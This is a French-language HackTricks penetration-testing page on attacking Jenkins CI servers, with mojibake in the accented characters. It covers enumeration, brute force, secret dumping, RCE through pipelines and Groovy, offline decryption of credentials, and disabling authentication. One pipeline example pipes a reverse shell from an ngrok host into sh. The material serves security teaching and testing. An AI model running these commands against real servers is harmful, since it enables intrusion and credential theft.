# S√©curit√© Jenkins

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Jenkins offre un moyen simple de mettre en place un environnement **d'int√©gration continue** ou **de livraison continue** (CI/CD) pour presque **toute** combinaison de **langues** et de d√©p√¥ts de code source en utilisant des pipelines, ainsi que d'automatiser d'autres t√¢ches de d√©veloppement routini√®res. Bien que Jenkins n'√©limine pas le **besoin de cr√©er des scripts pour chaque √©tape**, il vous offre un moyen plus rapide et plus robuste d'int√©grer toute votre cha√Æne d'outils de construction, de test et de d√©ploiement que vous pouvez facilement construire vous-m√™me.\
D√©finition de [ici](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## √ânum√©ration non authentifi√©e

Pour rechercher des pages Jenkins int√©ressantes sans authentification comme (_/people_ ou _/asynchPeople_, qui listent les utilisateurs actuels), vous pouvez utiliser :
```
msf> use auxiliary/scanner/http/jenkins_enum
```
V√©rifiez si vous pouvez ex√©cuter des commandes sans n√©cessiter d'authentification :
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sans identifiants, vous pouvez regarder √† l'int√©rieur du chemin _**/asynchPeople/**_ ou _**/securityRealm/user/admin/search/index?q=**_ pour les **noms d'utilisateur**.

Vous pourriez √™tre capable d'obtenir la version de Jenkins depuis le chemin _**/oops**_ ou _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Vuln√©rabilit√©s Connues

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Connexion

Dans les informations de base, vous pouvez v√©rifier **toutes les mani√®res de se connecter √† Jenkins** :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Inscription

Vous pourrez trouver des instances Jenkins qui **permettent de cr√©er un compte et de se connecter √† l'int√©rieur. Aussi simple que cela.**

### **Connexion SSO**

De plus, si la **fonctionnalit√©**/**plugins** **SSO** √©taient pr√©sents, alors vous devriez essayer de **vous connecter** √† l'application en utilisant un compte de test (par exemple, un compte de test **Github/Bitbucket**). Astuce de [**ici**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** n'impl√©mente aucune **politique de mot de passe** ou de mitigation de **bruteforce de nom d'utilisateur**. Donc, vous **devriez** toujours essayer de **bruteforcer** les utilisateurs car probablement des **mots de passe faibles** sont utilis√©s (m√™me des **noms d'utilisateur comme mots de passe** ou des noms d'utilisateur **invers√©s** comme mots de passe).
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Attaque par pulv√©risation de mots de passe

Utilisez [ce script python](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) ou [ce script powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Contournement de la liste blanche d'IP

De nombreuses organisations combinent des **syst√®mes de gestion de contr√¥le de source bas√©s sur SaaS** (comme GitHub ou GitLab) avec une solution **CI** interne et auto-h√©berg√©e (par exemple Jenkins, TeamCity) permettant √† ces syst√®mes CI de **recevoir des √©v√©nements webhook des fournisseurs de contr√¥le de source SaaS**, dans le simple but de d√©clencher des jobs de pipeline.

Par cons√©quent, les organisations **mettent en liste blanche** les plages d'**IP** du **SCM** leur permettant d'atteindre le syst√®me CI **interne** avec des **webhooks**. Cependant, notez comment **n'importe qui** peut cr√©er un **compte** sur Github ou Gitlab et le faire **d√©clencher un webhook** qui pourrait envoyer une requ√™te √† ce syst√®me CI **interne**.

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## Abus internes de Jenkins

Dans ces sc√©narios, nous allons supposer que vous avez un compte valide pour acc√©der √† Jenkins.

{% hint style="warning" %}
Selon le m√©canisme d'**Autorisation** configur√© dans Jenkins et la permission de l'utilisateur compromis, vous **pourriez √™tre capable ou non de r√©aliser les attaques suivantes.**
{% endhint %}

Pour plus d'informations, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Lister les utilisateurs

Si vous avez acc√©d√© √† Jenkins, vous pouvez lister les autres utilisateurs enregistr√©s sur [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Extraire les builds pour trouver des secrets en clair

Utilisez [ce script](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) pour extraire les sorties de console de build et les variables d'environnement de build afin de, esp√©rons-le, trouver des secrets en clair.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Vol de donn√©es d'identification SSH**

Si l'utilisateur compromis a **suffisamment de privil√®ges pour cr√©er/modifier un nouveau n≈ìud Jenkins** et que des donn√©es d'identification SSH sont d√©j√† stock√©es pour acc√©der √† d'autres n≈ìuds, il pourrait **voler ces donn√©es d'identification** en cr√©ant/modifiant un n≈ìud et **en d√©finissant un h√¥te qui enregistrera les donn√©es d'identification** sans v√©rifier la cl√© de l'h√¥te :

![](<../../.gitbook/assets/image (56).png>)

Vous trouverez g√©n√©ralement les donn√©es d'identification SSH de Jenkins dans un **fournisseur global** (`/credentials/`), vous pouvez donc √©galement les extraire comme vous le feriez pour tout autre secret. Plus d'informations dans la [**section sur l'extraction de secrets**](./#dumping-secrets).

### **Ex√©cution de code √† distance (RCE) dans Jenkins**

Obtenir un **shell sur le serveur Jenkins** donne √† l'attaquant l'opportunit√© de divulguer tous les **secrets** et **variables d'environnement** et d'**exploiter d'autres machines** situ√©es sur le m√™me r√©seau ou m√™me de **r√©cup√©rer des donn√©es d'identification cloud**.

Par d√©faut, Jenkins ex√©cutera les constructions **"en tant que syst√®me"**. En d'autres termes, elles sont attribu√©es √† l'utilisateur **tout-puissant SYSTEM**, ce qui signifie que toute action ex√©cut√©e pendant la construction a la permission de faire ce qu'elle veut.

### **RCE en cr√©ant/modifiant un projet**

Cr√©er/Modifier un projet est une mani√®re d'obtenir un RCE sur le serveur Jenkins :

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE en ex√©cutant un script Groovy**

Vous pouvez √©galement obtenir un RCE en ex√©cutant un script Groovy, ce qui pourrait √™tre plus discret que de cr√©er un nouveau projet :

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE en cr√©ant/modifiant un pipeline

Vous pouvez √©galement obtenir un **RCE en cr√©ant/modifiant un pipeline** :

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Exploitation de pipelines

Pour exploiter des pipelines, vous devez toujours avoir acc√®s √† Jenkins.

### Construire des pipelines

Les **pipelines** peuvent √©galement √™tre utilis√©s comme **m√©canisme de construction dans les projets**, dans ce cas, un **fichier √† l'int√©rieur du d√©p√¥t** peut contenir la syntaxe du pipeline. Par d√©faut, `/Jenkinsfile` est utilis√© :

![](<../../.gitbook/assets/image (14) (1) (1).png>)

Il est √©galement possible de **stocker des fichiers de configuration de pipeline √† d'autres endroits** (dans d'autres d√©p√¥ts par exemple) dans le but de **s√©parer** l'acc√®s au d√©p√¥t et l'acc√®s au pipeline.

Si un attaquant a **un acc√®s en √©criture sur ce fichier**, il pourra le **modifier** et **potentiellement d√©clencher** le pipeline sans m√™me avoir acc√®s √† Jenkins.\
Il est possible que l'attaquant doive **contourner certaines protections de branche** (selon la plateforme et les privil√®ges de l'utilisateur, elles pourraient √™tre contourn√©es ou non).

Les d√©clencheurs les plus courants pour ex√©cuter un pipeline personnalis√© sont :

* **Pull request** vers la branche principale (ou potentiellement vers d'autres branches)
* **Push vers la branche principale** (ou potentiellement vers d'autres branches)
* **Mise √† jour de la branche principale** et attendre qu'elle soit ex√©cut√©e d'une mani√®re ou d'une autre

{% hint style="info" %}
Si vous √™tes un **utilisateur externe**, vous ne devriez pas vous attendre √† cr√©er une **PR vers la branche principale** du d√©p√¥t d'**un autre utilisateur/organisation** et **d√©clencher le pipeline**... mais si c'est **mal configur√©**, vous pourriez compl√®tement **compromettre des entreprises en exploitant simplement cela**.
{% endhint %}

### RCE de pipeline

Dans la section RCE pr√©c√©dente, une technique a d√©j√† √©t√© indiqu√©e pour [**obtenir un RCE en modifiant un pipeline**](./#rce-creating-modifying-pipeline).

### V√©rification des variables d'environnement

Il est possible de d√©clarer des **variables d'environnement en texte clair** pour l'ensemble du pipeline ou pour des √©tapes sp√©cifiques. Ces variables d'environnement **ne devraient pas contenir d'informations sensibles**, mais un attaquant pourrait toujours **v√©rifier toutes les configurations** des pipelines/Jenkinsfiles :
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Extraction de secrets

Pour des informations sur la mani√®re dont les secrets sont g√©n√©ralement g√©r√©s par Jenkins, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Les identifiants peuvent √™tre **limit√©s aux fournisseurs globaux** (`/credentials/`) ou √† **des projets sp√©cifiques** (`/job/<nom-du-projet>/configure`). Par cons√©quent, pour exfiltrer tous les secrets, vous devez **compromettre au moins tous les projets** qui contiennent des secrets et ex√©cuter des pipelines personnalis√©s/empoisonn√©s.

Il y a un autre probl√®me, pour obtenir un **secret √† l'int√©rieur de l'environnement** d'un pipeline, vous devez **conna√Ætre le nom et le type du secret**. Par exemple, si vous essayez de **charger** un **secret `usernamePassword`** comme un **secret `string`**, vous obtiendrez cette **erreur** :
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Voici comment charger certains types de secrets courants :
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
√Ä la fin de cette page, vous pouvez **trouver tous les types de credentials** : [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La meilleure fa√ßon de **r√©cup√©rer tous les secrets en une fois** est de **compromettre** la machine **Jenkins** (en ex√©cutant un reverse shell dans le **n≈ìud int√©gr√©** par exemple) puis de **divulguer** les **cl√©s ma√Ætresses** et les **secrets chiffr√©s** et de les d√©chiffrer hors ligne.\
Plus d'informations sur comment faire cela dans la [section N≈ìuds & Agents](./#nodes-and-agents) et dans la [section Post Exploitation](./#post-exploitation).
{% endhint %}

### D√©clencheurs

D'apr√®s [la documentation](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers) : La directive `triggers` d√©finit les **moyens automatis√©s par lesquels le Pipeline devrait √™tre relanc√©**. Pour les Pipelines qui sont int√©gr√©s √† une source telle que GitHub ou BitBucket, `triggers` peut ne pas √™tre n√©cessaire car une int√©gration bas√©e sur les webhooks sera probablement d√©j√† pr√©sente. Les d√©clencheurs actuellement disponibles sont `cron`, `pollSCM` et `upstream`.

Exemple de cron :
```bash
triggers { cron('H */4 * * 1-5') }
```
Consultez **d'autres exemples dans la documentation**.

### N≈ìuds & Agents

Une **instance Jenkins** peut avoir **diff√©rents agents ex√©cut√©s sur diff√©rentes machines**. Du point de vue d'un attaquant, l'acc√®s √† diff√©rentes machines signifie **diff√©rents potentiels identifiants cloud** √† voler ou **diff√©rents acc√®s r√©seau** qui pourraient √™tre abus√©s pour exploiter d'autres machines.

Pour plus d'informations, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Vous pouvez √©num√©rer les **n≈ìuds configur√©s** dans `/computer/`, vous trouverez g√©n√©ralement le **`N≈ìud Int√©gr√©`** (qui est le n≈ìud ex√©cutant Jenkins) et potentiellement plus :

![](<../../.gitbook/assets/image (25).png>)

Il est **particuli√®rement int√©ressant de compromettre le N≈ìud Int√©gr√©** car il contient des informations sensibles sur Jenkins.

Pour indiquer que vous souhaitez **ex√©cuter** le **pipeline** dans le **n≈ìud Jenkins int√©gr√©**, vous pouvez sp√©cifier dans le pipeline la configuration suivante :
```bash
pipeline {
agent {label 'built-in'}
```
### Exemple complet

Pipeline dans un agent sp√©cifique, avec un d√©clencheur cron, avec des variables d'environnement pipeline et stage, chargeant 2 variables dans une √©tape et envoyant un reverse shell :
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Secrets Jenkins

Vous pouvez lister les secrets en acc√©dant √† `/credentials/` si vous avez suffisamment de permissions. Notez que cela ne listera que les secrets √† l'int√©rieur du fichier `credentials.xml`, mais les **fichiers de configuration de build** pourraient √©galement contenir **davantage de credentials**.

Si vous pouvez **voir la configuration de chaque projet**, vous pouvez aussi y voir les **noms des credentials (secrets)** utilis√©s pour acc√©der au d√©p√¥t et **d'autres credentials du projet**.

![](<../../.gitbook/assets/image (9) (1) (1) (1).png>)

#### Depuis Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Depuis le disque

Ces fichiers sont n√©cessaires pour **d√©crypter les secrets Jenkins** :

* secrets/master.key
* secrets/hudson.util.Secret

Ces **secrets peuvent g√©n√©ralement √™tre trouv√©s dans** :

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Voici une regex pour les trouver :
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### D√©crypter les secrets Jenkins hors ligne

Si vous avez r√©cup√©r√© **les mots de passe n√©cessaires pour d√©crypter les secrets**, utilisez [**ce script**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **pour d√©crypter ces secrets**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### D√©crypter les secrets Jenkins depuis Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Cr√©er un nouvel utilisateur administrateur

1. Acc√©dez au fichier de configuration Jenkins `config.xml` dans `/var/lib/jenkins/config.xml` ou `C:\Program Files (x86)\Jenkis\`
2. Recherchez le mot `<useSecurity>true</useSecurity>` et changez le mot **`true`** en **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Red√©marrez** le serveur **Jenkins** : `service jenkins restart`
4. Maintenant, retournez sur le portail Jenkins et **Jenkins ne demandera aucune identification** cette fois. Vous naviguez vers "**G√©rer Jenkins**" pour d√©finir √† nouveau le **mot de passe administrateur**.
5. **Activez** √† nouveau la **s√©curit√©** en modifiant les param√®tres en `<useSecurity>true</useSecurity>` et **red√©marrez Jenkins √† nouveau**.

## R√©f√©rences

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
